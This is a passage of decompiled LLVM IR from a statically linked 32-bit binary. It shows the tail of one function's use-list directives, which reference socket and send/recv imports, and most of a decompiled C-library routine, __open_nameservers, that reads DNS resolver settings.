  store i32 %v2_8056e99, i32* @edi, align 4
  %v3_8056e99 = add i32 %v0_8056e8d, 232
  %v1_8056e9a = inttoptr i32 %v3_8056e99 to i32*
  %v2_8056e9a = load i32, i32* %v1_8056e9a, align 4
  store i32 %v2_8056e9a, i32* @ebp, align 4
  ret i32 %v3_8056e8d

; uselistorder directives
  uselistorder i32 %v0_8056e8d, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_8056e64, { 1, 0, 2, 3 }
  uselistorder i32 %v0_8056e1a, { 1, 0 }
  uselistorder i32 %v1_8056e21.pre-phi, { 4, 3, 2, 1, 0 }
  uselistorder i16 %stack_var_-180.1, { 1, 0 }
  uselistorder i32 %v0_8056dcc.pre, { 1, 0 }
  uselistorder i32 %v5_8056d9f, { 1, 0 }
  uselistorder i32 %v3_8056d9f, { 2, 0, 1, 3 }
  uselistorder i32 %v1_8056d67, { 0, 5, 4, 3, 2, 1, 6 }
  uselistorder i32 %v0_8056d30, { 1, 0, 2, 3 }
  uselistorder i32 %v0_8056cfe, { 1, 0 }
  uselistorder i32 %v3_8056cdd, { 1, 0, 2 }
  uselistorder i32 %v0_8056cce, { 1, 0 }
  uselistorder i32 %v5_8056cc4, { 1, 0 }
  uselistorder i32* %v3_8056cc4, { 1, 0 }
  uselistorder i32 %v0_8056b9a67, { 0, 1, 6, 5, 4, 3, 2 }
  uselistorder i32 %v0_8056cc4, { 2, 1, 0 }
  uselistorder i32 %v5_8056cbe, { 1, 0 }
  uselistorder i32 %v1_8056cbd, { 2, 1, 0, 3 }
  uselistorder i32 %v1_8056cb9, { 0, 2, 1, 3 }
  uselistorder i32 %v0_8056c7d, { 0, 6, 1, 2, 3, 4, 5, 7, 8, 9 }
  uselistorder i32 %v7_8056c57, { 1, 0 }
  uselistorder i32 %v1_8056c48, { 1, 0 }
  uselistorder i32 %v3_8056c19, { 2, 3, 0, 1 }
  uselistorder i32 %v0_8056c07, { 1, 3, 2, 0, 4 }
  uselistorder i32 %v1_8056bae, { 1, 2, 0 }
  uselistorder i32 %v0_8056bae, { 4, 1, 2, 3, 0, 5 }
  uselistorder i32 %v5_8056b88, { 1, 0 }
  uselistorder i32 %v0_8056b90, { 0, 5, 4, 3, 2, 1 }
  uselistorder i32 %v0_8056b7e, { 1, 0, 2 }
  uselistorder i32 %v5_8056b2a, { 1, 0 }
  uselistorder i32* %v2_8056b2a, { 1, 0, 2 }
  uselistorder i32 %v3_8056ae2, { 1, 2, 0, 3 }
  uselistorder i32 %v0_8056ac8, { 0, 8, 1, 2, 3, 4, 5, 6, 7, 9, 10 }
  uselistorder i32 %v0_8056aa7, { 4, 0, 1, 2, 3, 5 }
  uselistorder i32 %v0_8056a87, { 4, 0, 1, 2, 3, 5 }
  uselistorder i32 %v0_8056a2d, { 4, 0, 1, 2, 3 }
  uselistorder i32 %v0_8056a12, { 5, 0, 1, 2, 3, 4, 6 }
  uselistorder i32 %v1_80569fb, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_8056983, { 0, 2, 1, 3 }
  uselistorder i32 %v1_8056936, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_8056917, { 2, 0, 1, 3, 4 }
  uselistorder i32 %v2_80568fb, { 1, 0 }
  uselistorder i32 %v3_80568f0, { 2, 3, 0, 1, 5, 4, 6 }
  uselistorder i32 %v0_80568ed, { 4, 0, 1, 2, 3, 5, 6 }
  uselistorder i32 %v0_8056892, { 5, 0, 1, 2, 3, 4 }
  uselistorder i32 %v0_805688d, { 0, 2, 1, 3 }
  uselistorder i32 %v1_8056876, { 1, 0 }
  uselistorder i32 %v1_8056842, { 3, 2, 1, 0 }
  uselistorder i32 %v0_805683383, { 2, 1, 0 }
  uselistorder i16 %v0_80567f3, { 4, 5, 0, 1, 2, 3 }
  uselistorder i32 %v15_80567ec, { 6, 7, 4, 5, 3, 2, 0, 1, 8, 9, 10, 11, 13, 14, 15, 16, 17, 12 }
  uselistorder i32 %v2_805675e, { 10, 5, 2, 7, 8, 1, 3, 9, 0, 4, 11, 6, 12, 13 }
  uselistorder i8** %stack_var_-252, { 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 82, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 70, 66, 67, 68, 69, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 83, 84, 85, 86, 87, 88 }
  uselistorder i32 248, { 1, 0 }
  uselistorder i32 51, { 9, 8, 1, 2, 3, 0, 4, 5, 6, 7 }
  uselistorder i32 136, { 1, 2, 0 }
  uselistorder i32 132, { 1, 2, 0 }
  uselistorder i32 148, { 1, 2, 0 }
  uselistorder i32 160, { 1, 4, 2, 3, 0 }
  uselistorder i32 68, { 3, 2, 4, 5, 1, 0 }
  uselistorder i32 27, { 2, 3, 1, 0 }
  uselistorder i32 100, { 1, 5, 3, 4, 2, 0 }
  uselistorder i32 67, { 1, 2, 0 }
  uselistorder i32 112, { 1, 5, 6, 7, 3, 4, 2, 0 }
  uselistorder i32 88, { 1, 2, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @__libc_recv, { 1, 4, 3, 2, 0 }
  uselistorder i32 10000, { 9, 0, 1, 2, 3, 4, 6, 7, 5, 8 }
  uselistorder i32 228, { 1, 0, 2 }
  uselistorder i32 (i32, i32, i32, i32)* @__libc_send, { 1, 6, 5, 11, 10, 9, 8, 7, 4, 3, 2, 0 }
  uselistorder i32 101, { 0, 2, 3, 1 }
  uselistorder i32 (i32, i32, i32)* @__libc_connect, { 0, 7, 6, 5, 4, 3, 2, 8, 1 }
  uselistorder i32 (i32, i32, i32)* @socket, { 0, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 12 }
  uselistorder i32 17, { 15, 13, 5, 12, 2, 3, 1, 6, 7, 8, 9, 17, 4, 16, 14, 10, 11, 0 }
  uselistorder i32 176, { 2, 3, 4, 1, 0 }
  uselistorder i32 (i32)* @inet_addr, { 3, 5, 4, 2, 1, 0 }
  uselistorder i32 158, { 1, 0 }
  uselistorder i32 156, { 1, 2, 0 }
  uselistorder i32 172, { 1, 2, 3, 0 }
  uselistorder i32 220, { 1, 2, 0 }
  uselistorder i32 224, { 0, 2, 1 }
  uselistorder i32 260, { 2, 1, 0, 3 }
  uselistorder i32 184, { 3, 1, 2, 0 }
  uselistorder i32 ()* @__GI_strncat, { 1, 0 }
  uselistorder i32 200, { 2, 1, 3, 4, 0 }
  uselistorder i32 (i8*, i32, i32)* @strncpy, { 1, 2, 3, 0 }
  uselistorder i32 104, { 3, 1, 4, 2, 0 }
  uselistorder i32 116, { 1, 3, 4, 2, 0 }
  uselistorder i32 72, { 1, 3, 4, 2, 5, 0 }
  uselistorder i32 84, { 4, 1, 5, 2, 6, 3, 0 }
  uselistorder i32 ptrtoint (i32* @0 to i32), { 13, 14, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 27, 26, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 50, 51, 47, 48, 49, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 66, 67, 64, 65 }
  uselistorder i32 -12, { 12, 6, 5, 7, 1, 8, 9, 10, 11, 0, 13, 26, 25, 24, 2, 18, 14, 3, 15, 16, 17, 19, 20, 4, 22, 21, 23, 27 }
  uselistorder i32 -8, { 9, 3, 2, 4, 0, 5, 6, 7, 8, 10, 22, 23, 24, 21, 1, 16, 11, 12, 13, 14, 15, 17, 18, 19, 20 }
  uselistorder i16 1, { 1, 0 }
  uselistorder i16* @global_var_805f4a4.1017, { 2, 1, 0 }
  uselistorder i64 4294967295, { 1, 0, 2 }
  uselistorder i64* @global_var_8065760.1016, { 2, 1, 0 }
  uselistorder i32 ptrtoint (i8** @global_var_8065748.1015 to i32), { 4, 3, 2, 1, 0 }
  uselistorder i8** @global_var_8065748.1015, { 1, 0 }
  uselistorder i32 1025, { 5, 6, 7, 0, 1, 2, 4, 3 }
  uselistorder i32 512, { 6, 3, 7, 8, 4, 5, 0, 1, 2 }
  uselistorder i8* %arg1, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_8056e8d, { 1, 0 }
  uselistorder label %dec_label_pc_8056e8a, { 1, 0 }
  uselistorder label %dec_label_pc_8056e1a, { 1, 0 }
  uselistorder label %dec_label_pc_8056e04, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8056df1, { 3, 2, 1, 0, 7, 6, 5, 4 }
  uselistorder label %dec_label_pc_8056dcc.backedge, { 0, 3, 2, 1 }
  uselistorder label %dec_label_pc_8056dc4, { 1, 0 }
  uselistorder label %dec_label_pc_8056dab, { 1, 2, 3, 0 }
  uselistorder label %dec_label_pc_8056d60, { 6, 1, 2, 3, 4, 5, 0 }
  uselistorder label %dec_label_pc_8056cfe, { 1, 0 }
  uselistorder label %dec_label_pc_8056cce, { 5, 2, 6, 4, 3, 0, 1 }
  uselistorder label %dec_label_pc_8056cc4, { 1, 0 }
  uselistorder label %dec_label_pc_8056cb9, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8056cb6, { 1, 0 }
  uselistorder label %dec_label_pc_8056c31, { 1, 2, 0 }
  uselistorder label %dec_label_pc_8056b88, { 1, 0 }
  uselistorder label %dec_label_pc_80569fb, { 1, 0 }
  uselistorder label %dec_label_pc_80569c4, { 1, 0 }
  uselistorder label %dec_label_pc_8056936, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8056842, { 1, 0 }
  uselistorder label %dec_label_pc_805682c, { 1, 0 }
}

define i32 @__open_nameservers() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-180 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-216 = alloca i32, align 4
  %v0_8056e9c = load i32, i32* @ebp, align 4
  store i32 134567199, i32* %stack_var_-216, align 4
  %v3_8056eab = ptrtoint i32* %stack_var_-216 to i32
  %v2_8056eb0 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_8056eb0, i32* @eax, align 4
  %v2_8056eb8 = call i32 @__pthread_return_void(i32 %v2_8056eb0, i32 134567199)
  %v1_8056ec4 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_805f4a8.953 to i32))
  store i32 %v1_8056ec4, i32* @eax, align 4
  %v0_8056ecc = load i32, i32* @global_var_8065b94.954, align 4
  %tmp41 = icmp slt i32 %v0_8056ecc, 1
  %tmp42 = icmp eq i1 %tmp41, false
  br i1 %tmp42, label %dec_label_pc_80570c3, label %dec_label_pc_8056ed9

dec_label_pc_8056ed9:                             ; preds = %entry
  store i32 ptrtoint (i32* @global_var_805ee90.1020 to i32), i32* %stack_var_-216, align 4
  %v2_8056ee5 = call i32 @__GI_fopen(i32 ptrtoint ([17 x i8]* @global_var_805ee5e.1021 to i32), i32 ptrtoint (i32* @global_var_805ee90.1020 to i32))
  store i32 %v2_8056ee5, i32* @eax, align 4
  %v1_8056eed = icmp eq i32 %v2_8056ee5, 0
  store i32 %v2_8056ee5, i32* @ebp, align 4
  %v1_8056ef1 = icmp eq i1 %v1_8056eed, false
  br i1 %v1_8056ef1, label %dec_label_pc_805708e.preheader, label %dec_label_pc_8056ef7

dec_label_pc_8056ef7:                             ; preds = %dec_label_pc_8056ed9
  store i32 ptrtoint (i32* @global_var_805ee90.1020 to i32), i32* %stack_var_-216, align 4
  %v2_8056f03 = call i32 @__GI_fopen(i32 ptrtoint ([24 x i8]* @global_var_805ee6f.1022 to i32), i32 ptrtoint (i32* @global_var_805ee90.1020 to i32))
  %v1_8056f0b = icmp eq i32 %v2_8056f03, 0
  store i32 %v2_8056f03, i32* @ebp, align 4
  %v1_8056f0f = icmp eq i1 %v1_8056f0b, false
  br i1 %v1_8056f0f, label %dec_label_pc_805708e.preheader, label %dec_label_pc_80570b8

dec_label_pc_805708e.preheader:                   ; preds = %dec_label_pc_8056ed9, %dec_label_pc_8056ef7
  %v2_8057095 = ptrtoint i32* %stack_var_-180 to i32
  %v3_8056fc9 = add i32 %v3_8056eab, 164
  %v4_8056fb8 = inttoptr i32 %tmp to i8*
  br label %dec_label_pc_805708e

dec_label_pc_8056f1a:                             ; preds = %dec_label_pc_8056f25
  %v1_8056f1a = add i32 %v0_8056f1a56, 1
  store i32 %v1_8056f1a, i32* @ebx, align 4
  %v1_8056f1b = inttoptr i32 %v1_8056f1a to i8*
  %v2_8056f1b = load i8, i8* %v1_8056f1b, align 1
  %v3_8056f1b = zext i8 %v2_8056f1b to i32
  %v5_8056f1b = and i32 %v6_8056f1b59, -256
  %v6_8056f1b = or i32 %v3_8056f1b, %v5_8056f1b
  store i32 %v6_8056f1b, i32* @ecx, align 4
  %v4_8056f1d = icmp eq i8 %v2_8056f1b, 0
  br i1 %v4_8056f1d, label %dec_label_pc_805708e, label %dec_label_pc_8056f25

dec_label_pc_8056f25:                             ; preds = %dec_label_pc_8056f25.lr.ph, %dec_label_pc_8056f1a
  %v6_8056f1b59 = phi i32 [ %v6_8056f1b53, %dec_label_pc_8056f25.lr.ph ], [ %v6_8056f1b, %dec_label_pc_8056f1a ]
  %v2_8056f1b58 = phi i8 [ %v2_8056f1b50, %dec_label_pc_8056f25.lr.ph ], [ %v2_8056f1b, %dec_label_pc_8056f1a ]
  %v1_8056f1b57 = phi i8* [ %v1_8056f1b49, %dec_label_pc_8056f25.lr.ph ], [ %v1_8056f1b, %dec_label_pc_8056f1a ]
  %v0_8056f1a56 = phi i32 [ %v0_8056f1b.pre, %dec_label_pc_8056f25.lr.ph ], [ %v1_8056f1a, %dec_label_pc_8056f1a ]
  store i32 %v0_8056f25.pre, i32* @eax, align 4
  %v2_8056f2a = sext i8 %v2_8056f1b58 to i32
  store i32 %v2_8056f2a, i32* @edx, align 4
  %v2_8056f2d = mul nsw i32 %v2_8056f2a, 2
  %v3_8056f2d = add i32 %v0_8056f25.pre, %v2_8056f2d
  %v4_8056f2d = inttoptr i32 %v3_8056f2d to i8*
  %v5_8056f2d = load i8, i8* %v4_8056f2d, align 1
  %v6_8056f2d = and i8 %v5_8056f2d, 32
  %v7_8056f2d = icmp eq i8 %v6_8056f2d, 0
  %v1_8056f31 = icmp eq i1 %v7_8056f2d, false
  br i1 %v1_8056f31, label %dec_label_pc_8056f1a, label %dec_label_pc_8056f33

dec_label_pc_8056f33:                             ; preds = %dec_label_pc_8056f25
  %v10_8056f33 = icmp eq i8 %v2_8056f1b58, 10
  br i1 %v10_8056f33, label %dec_label_pc_805708e, label %dec_label_pc_8056f3c

dec_label_pc_8056f3c:                             ; preds = %dec_label_pc_8056f33
  %v10_8056f3c = icmp eq i8 %v2_8056f1b58, 35
  %v1_8056f47 = icmp eq i1 %v10_8056f3c, false
  br i1 %v1_8056f47, label %dec_label_pc_8056f98.preheader, label %dec_label_pc_805708e

dec_label_pc_8056f98.preheader:                   ; preds = %dec_label_pc_8056f3c
  %v2_8056f986 = load i8, i8* %v1_8056f1b57, align 1
  %v3_8056f987 = icmp eq i8 %v2_8056f986, 0
  br i1 %v3_8056f987, label %dec_label_pc_8056fa4, label %dec_label_pc_8056f9d

dec_label_pc_8056f4e:                             ; preds = %dec_label_pc_8056f9d
  store i32 %stack_var_-196.013, i32* @eax, align 4
  %v1_8056f52 = load i32, i32* @esp, align 4
  %v3_8056f52 = mul nuw nsw i32 %stack_var_-196.013, 4
  %v4_8056f52 = add nuw nsw i32 %v3_8056f52, 152
  %v5_8056f52 = add i32 %v4_8056f52, %v1_8056f52
  %v6_8056f52 = inttoptr i32 %v5_8056f52 to i32*
  store i32 %v0_8056f52, i32* %v6_8056f52, align 4
  %v0_8056f5c.pre = load i32, i32* @ebx, align 4
  %v4_8056f5c.pre = load i32, i32* @ecx, align 4
  %v1_8056f5c60 = inttoptr i32 %v0_8056f5c.pre to i8*
  %v2_8056f5c61 = load i8, i8* %v1_8056f5c60, align 1
  %v3_8056f5c62 = zext i8 %v2_8056f5c61 to i32
  %v5_8056f5c63 = and i32 %v4_8056f5c.pre, -256
  %v6_8056f5c64 = or i32 %v3_8056f5c62, %v5_8056f5c63
  %v4_8056f5e65 = icmp eq i8 %v2_8056f5c61, 0
  br i1 %v4_8056f5e65, label %dec_label_pc_8056f7b.preheader, label %dec_label_pc_8056f62.lr.ph

dec_label_pc_8056f62.lr.ph:                       ; preds = %dec_label_pc_8056f4e
  %v0_8056f62.pre = load i32, i32* @global_var_805f23c, align 4
  br label %dec_label_pc_8056f62

dec_label_pc_8056f5b:                             ; preds = %dec_label_pc_8056f70
  %v1_8056f5b = add i32 %v0_8056f5b67, 1
  store i32 %v1_8056f5b, i32* @ebx, align 4
  %v1_8056f5c = inttoptr i32 %v1_8056f5b to i8*
  %v2_8056f5c = load i8, i8* %v1_8056f5c, align 1
  %v3_8056f5c = zext i8 %v2_8056f5c to i32
  %v5_8056f5c = and i32 %v6_8056f5c69, -256
  %v6_8056f5c = or i32 %v3_8056f5c, %v5_8056f5c
  %v4_8056f5e = icmp eq i8 %v2_8056f5c, 0
  br i1 %v4_8056f5e, label %dec_label_pc_8056f7b.preheader, label %dec_label_pc_8056f62

dec_label_pc_8056f62:                             ; preds = %dec_label_pc_8056f62.lr.ph, %dec_label_pc_8056f5b
  %v6_8056f5c69 = phi i32 [ %v6_8056f5c64, %dec_label_pc_8056f62.lr.ph ], [ %v6_8056f5c, %dec_label_pc_8056f5b ]
  %v2_8056f5c68 = phi i8 [ %v2_8056f5c61, %dec_label_pc_8056f62.lr.ph ], [ %v2_8056f5c, %dec_label_pc_8056f5b ]
  %v0_8056f5b67 = phi i32 [ %v0_8056f5c.pre, %dec_label_pc_8056f62.lr.ph ], [ %v1_8056f5b, %dec_label_pc_8056f5b ]
  store i32 %v0_8056f62.pre, i32* @eax, align 4
  %v2_8056f67 = sext i8 %v2_8056f5c68 to i32
  store i32 %v2_8056f67, i32* @edx, align 4
  %v2_8056f6a = mul nsw i32 %v2_8056f67, 2
  %v3_8056f6a = add i32 %v0_8056f62.pre, %v2_8056f6a
  %v4_8056f6a = inttoptr i32 %v3_8056f6a to i8*
  %v5_8056f6a = load i8, i8* %v4_8056f6a, align 1
  %v6_8056f6a = and i8 %v5_8056f6a, 32
  %v7_8056f6a = icmp eq i8 %v6_8056f6a, 0
  %v1_8056f6e = icmp eq i1 %v7_8056f6a, false
  br i1 %v1_8056f6e, label %dec_label_pc_8056f7b.preheader, label %dec_label_pc_8056f70

dec_label_pc_8056f70:                             ; preds = %dec_label_pc_8056f62
  %v10_8056f70 = icmp eq i8 %v2_8056f5c68, 10
  %v1_8056f73 = icmp eq i1 %v10_8056f70, false
  br i1 %v1_8056f73, label %dec_label_pc_8056f5b, label %dec_label_pc_8056f7b.preheader

dec_label_pc_8056f7b.preheader:                   ; preds = %dec_label_pc_8056f70, %dec_label_pc_8056f62, %dec_label_pc_8056f5b, %dec_label_pc_8056f4e
  %v0_8056f5b.lcssa = phi i32 [ %v0_8056f5c.pre, %dec_label_pc_8056f4e ], [ %v1_8056f5b, %dec_label_pc_8056f5b ], [ %v0_8056f5b67, %dec_label_pc_8056f62 ], [ %v0_8056f5b67, %dec_label_pc_8056f70 ]
  %v6_8056f5c.lcssa = phi i32 [ %v6_8056f5c64, %dec_label_pc_8056f4e ], [ %v6_8056f5c, %dec_label_pc_8056f5b ], [ %v6_8056f5c69, %dec_label_pc_8056f62 ], [ %v6_8056f5c69, %dec_label_pc_8056f70 ]
  %v1_8056f7b75 = inttoptr i32 %v0_8056f5b.lcssa to i8*
  %v2_8056f7b76 = load i8, i8* %v1_8056f7b75, align 1
  %v3_8056f7b77 = zext i8 %v2_8056f7b76 to i32
  %v5_8056f7b78 = and i32 %v6_8056f5c.lcssa, -256
  %v6_8056f7b79 = or i32 %v3_8056f7b77, %v5_8056f7b78
  store i32 %v6_8056f7b79, i32* @ecx, align 4
  %v4_8056f7d80 = icmp eq i8 %v2_8056f7b76, 0
  br i1 %v4_8056f7d80, label %dec_label_pc_8056f94, label %dec_label_pc_8056f81

dec_label_pc_8056f77:                             ; preds = %dec_label_pc_8056f8f, %dec_label_pc_8056f81
  store i8 0, i8* %v1_8056f7b83, align 1
  %v0_8056f7a = load i32, i32* @ebx, align 4
  %v1_8056f7a = add i32 %v0_8056f7a, 1
  store i32 %v1_8056f7a, i32* @ebx, align 4
  %v4_8056f7b.pre = load i32, i32* @ecx, align 4
  %v1_8056f7b = inttoptr i32 %v1_8056f7a to i8*
  %v2_8056f7b = load i8, i8* %v1_8056f7b, align 1
  %v3_8056f7b = zext i8 %v2_8056f7b to i32
  %v5_8056f7b = and i32 %v4_8056f7b.pre, -256
  %v6_8056f7b = or i32 %v3_8056f7b, %v5_8056f7b
  store i32 %v6_8056f7b, i32* @ecx, align 4
  %v4_8056f7d = icmp eq i8 %v2_8056f7b, 0
  br i1 %v4_8056f7d, label %dec_label_pc_8056f94, label %dec_label_pc_8056f81

dec_label_pc_8056f81:                             ; preds = %dec_label_pc_8056f7b.preheader, %dec_label_pc_8056f77
  %v2_8056f7b84 = phi i8 [ %v2_8056f7b, %dec_label_pc_8056f77 ], [ %v2_8056f7b76, %dec_label_pc_8056f7b.preheader ]
  %v1_8056f7b83 = phi i8* [ %v1_8056f7b, %dec_label_pc_8056f77 ], [ %v1_8056f7b75, %dec_label_pc_8056f7b.preheader ]
  %v0_8056f9882 = phi i32 [ %v1_8056f7a, %dec_label_pc_8056f77 ], [ %v0_8056f5b.lcssa, %dec_label_pc_8056f7b.preheader ]
  %v0_8056f81 = load i32, i32* @global_var_805f23c, align 4
  store i32 %v0_8056f81, i32* @eax, align 4
  %v2_8056f86 = sext i8 %v2_8056f7b84 to i32
  store i32 %v2_8056f86, i32* @edx, align 4
  %v2_8056f89 = mul nsw i32 %v2_8056f86, 2
  %v3_8056f89 = add i32 %v0_8056f81, %v2_8056f89
  %v4_8056f89 = inttoptr i32 %v3_8056f89 to i8*
  %v5_8056f89 = load i8, i8* %v4_8056f89, align 1
  %v6_8056f89 = and i8 %v5_8056f89, 32
  %v7_8056f89 = icmp eq i8 %v6_8056f89, 0
  %v1_8056f8d = icmp eq i1 %v7_8056f89, false
  br i1 %v1_8056f8d, label %dec_label_pc_8056f77, label %dec_label_pc_8056f8f

dec_label_pc_8056f8f:                             ; preds = %dec_label_pc_8056f81
  %v10_8056f8f = icmp eq i8 %v2_8056f7b84, 10
  br i1 %v10_8056f8f, label %dec_label_pc_8056f77, label %dec_label_pc_8056f94

dec_label_pc_8056f94:                             ; preds = %dec_label_pc_8056f77, %dec_label_pc_8056f8f, %dec_label_pc_8056f7b.preheader
  %v0_8056f98.lcssa = phi i32 [ %v0_8056f5b.lcssa, %dec_label_pc_8056f7b.preheader ], [ %v0_8056f9882, %dec_label_pc_8056f8f ], [ %v1_8056f7a, %dec_label_pc_8056f77 ]
  %v1_8056f7b.lcssa = phi i8* [ %v1_8056f7b75, %dec_label_pc_8056f7b.preheader ], [ %v1_8056f7b83, %dec_label_pc_8056f8f ], [ %v1_8056f7b, %dec_label_pc_8056f77 ]
  %v4_8056f94 = add nuw nsw i32 %stack_var_-196.013, 1
  %v2_8056f98 = load i8, i8* %v1_8056f7b.lcssa, align 1
  %v3_8056f98 = icmp eq i8 %v2_8056f98, 0
  br i1 %v3_8056f98, label %dec_label_pc_8056fa4, label %dec_label_pc_8056f9d

dec_label_pc_8056f9d:                             ; preds = %dec_label_pc_8056f98.preheader, %dec_label_pc_8056f94
  %v0_8056f52 = phi i32 [ %v0_8056f98.lcssa, %dec_label_pc_8056f94 ], [ %v0_8056f1a56, %dec_label_pc_8056f98.preheader ]
  %stack_var_-196.013 = phi i32 [ %v4_8056f94, %dec_label_pc_8056f94 ], [ 0, %dec_label_pc_8056f98.preheader ]
  %v7_8056fa2 = icmp sgt i32 %stack_var_-196.013, 4
  br i1 %v7_8056fa2, label %dec_label_pc_8056fa4, label %dec_label_pc_8056f4e

dec_label_pc_8056fa4:                             ; preds = %dec_label_pc_8056f94, %dec_label_pc_8056f9d, %dec_label_pc_8056f98.preheader
  %stack_var_-196.0.lcssa = phi i32 [ 0, %dec_label_pc_8056f98.preheader ], [ %v4_8056f94, %dec_label_pc_8056f94 ], [ %stack_var_-196.013, %dec_label_pc_8056f9d ]
  store i32 %tmp, i32* @edi, align 4
  %v0_8056fab = load i32, i32* @esi, align 4
  store i32 1, i32* @esi, align 4
  store i32 ptrtoint ([11 x i8]* @global_var_805ee87.1023 to i32), i32* %stack_var_-216, align 4
  %v5_8056fb8 = call i32 @__GI_strcoll(i8* %v4_8056fb8, i32 ptrtoint ([11 x i8]* @global_var_805ee87.1023 to i32), i32 %v0_8056fab, i32 %v0_8056fab)
  store i32 %v5_8056fb8, i32* @eax, align 4
  %v1_8056fc0 = icmp eq i32 %v5_8056fb8, 0
  br i1 %v1_8056fc0, label %dec_label_pc_8056fe8.preheader, label %dec_label_pc_8056ff9

dec_label_pc_8056fe8.preheader:                   ; preds = %dec_label_pc_8056fa4
  %v0_8056fe889 = load i32, i32* @esi, align 4
  %v5_8056fec98 = icmp slt i32 %v0_8056fe889, %stack_var_-196.0.lcssa
  br i1 %v5_8056fec98, label %dec_label_pc_8056fee.lr.ph, label %dec_label_pc_8056ff9

dec_label_pc_8056fee.lr.ph:                       ; preds = %dec_label_pc_8056fe8.preheader
  %v0_8056fee.pre = load i32, i32* @global_var_8065b94.954, align 4
  br label %dec_label_pc_8056fee

dec_label_pc_8056fc6:                             ; preds = %dec_label_pc_8056fee
  %v2_8056fc9 = mul i32 %v0_8056fe899, 4
  %v4_8056fc9 = add i32 %v2_8056fc9, %v3_8056fc9
  %v5_8056fc9 = inttoptr i32 %v4_8056fc9 to i32*
  %v6_8056fc9 = load i32, i32* %v5_8056fc9, align 4
  %v1_8056fd0 = add i32 %v0_8056fe899, 1
  store i32 %v1_8056fd0, i32* @esi, align 4
  %v1_8056fd1 = inttoptr i32 %v6_8056fc9 to i8*
  %v2_8056fd1 = call i32 @__GI_strdup(i8* %v1_8056fd1)
  %v1_8056fd9 = load i32, i32* @ebx, align 4
  %v2_8056fd9 = mul i32 %v1_8056fd9, 4
  %v3_8056fd9 = add i32 %v2_8056fd9, 134634376
  %v4_8056fd9 = inttoptr i32 %v3_8056fd9 to i32*
  store i32 %v2_8056fd1, i32* %v4_8056fd9, align 4
  %v0_8056fe0 = load i32, i32* @ebx, align 4
  %v1_8056fe0 = add i32 %v0_8056fe0, 1
  store i32 %v1_8056fe0, i32* @eax, align 4
  store i32 %v1_8056fe0, i32* @global_var_8065b94.954, align 4
  %v0_8056fe8 = load i32, i32* @esi, align 4
  %v5_8056fec = icmp slt i32 %v0_8056fe8, %stack_var_-196.0.lcssa
  br i1 %v5_8056fec, label %dec_label_pc_8056fee, label %dec_label_pc_8056ff9

dec_label_pc_8056fee:                             ; preds = %dec_label_pc_8056fee.lr.ph, %dec_label_pc_8056fc6
  %v0_8056fee = phi i32 [ %v0_8056fee.pre, %dec_label_pc_8056fee.lr.ph ], [ %v1_8056fe0, %dec_label_pc_8056fc6 ]
  %v0_8056fe899 = phi i32 [ %v0_8056fe889, %dec_label_pc_8056fee.lr.ph ], [ %v0_8056fe8, %dec_label_pc_8056fc6 ]
  store i32 %v0_8056fee, i32* @ebx, align 4
  %v7_8056ff7 = icmp sgt i32 %v0_8056fee, 2
  br i1 %v7_8056ff7, label %dec_label_pc_8056ff9, label %dec_label_pc_8056fc6

dec_label_pc_8056ff9:                             ; preds = %dec_label_pc_8056fe8.preheader, %dec_label_pc_8056fc6, %dec_label_pc_8056fee, %dec_label_pc_8056fa4
  %v0_8056ff9 = load i32, i32* @ebx, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_805ee92.1024 to i32), i32* %stack_var_-216, align 4
  %v0_8057000 = load i32, i32* @edi, align 4
  %v4_8057001 = inttoptr i32 %v0_8057000 to i8*
  %v5_8057001 = call i32 @__GI_strcoll(i8* %v4_8057001, i32 ptrtoint ([7 x i8]* @global_var_805ee92.1024 to i32), i32 %v0_8056ff9, i32 %v0_8056ff9)
  store i32 %v5_8057001, i32* @eax, align 4
  %v1_8057009 = icmp eq i32 %v5_8057001, 0
  br i1 %v1_8057009, label %dec_label_pc_805704b.preheader, label %dec_label_pc_805700d

dec_label_pc_805700d:                             ; preds = %dec_label_pc_8056ff9
  %v0_805700d = load i32, i32* @ecx, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_805ee99.1025 to i32), i32* %stack_var_-216, align 4
  %v0_8057014 = load i32, i32* @edi, align 4
  %v4_8057015 = inttoptr i32 %v0_8057014 to i8*
  %v5_8057015 = call i32 @__GI_strcoll(i8* %v4_8057015, i32 ptrtoint ([7 x i8]* @global_var_805ee99.1025 to i32), i32 %v0_805700d, i32 %v0_805700d)
  %v1_805701d = icmp eq i32 %v5_8057015, 0
  br i1 %v1_805701d, label %dec_label_pc_805704b.preheader, label %dec_label_pc_805708e

dec_label_pc_805704b.preheader:                   ; preds = %dec_label_pc_8056ff9, %dec_label_pc_805700d
  %v0_805704b100 = load i32, i32* @global_var_8065b98.1018, align 8
  %tmp43103 = icmp slt i32 %v0_805704b100, 1
  %tmp44104 = icmp eq i1 %tmp43103, false
  br i1 %tmp44104, label %dec_label_pc_8057023, label %dec_label_pc_8057054

